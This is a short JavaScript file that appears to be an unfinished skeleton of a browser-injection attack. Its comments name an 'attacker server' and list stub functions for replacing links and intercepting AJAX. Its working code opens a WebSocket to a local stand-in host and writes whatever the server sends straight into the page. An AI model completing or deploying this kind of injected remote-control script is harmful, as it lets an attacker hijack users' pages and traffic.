(() => {
    function replaceLinks() {
        // TODO Implement this
    }

    function interceptAjax() {
        // TODO implement this
    }

    (() => {
        // TODO build file using a config containing the attacker server
        const ws = new WebSocket('ws://localhost:8080/ws')

        ws.onopen = (e) => {
            console.log('Open')
            console.log(e)
        }

        ws.onmessage = (msg, a) => {
            document.write(JSON.stringify(msg.data))
        }

        setInterval(() => {
            ws.send('hi')
        }, 500)
    })()
})()
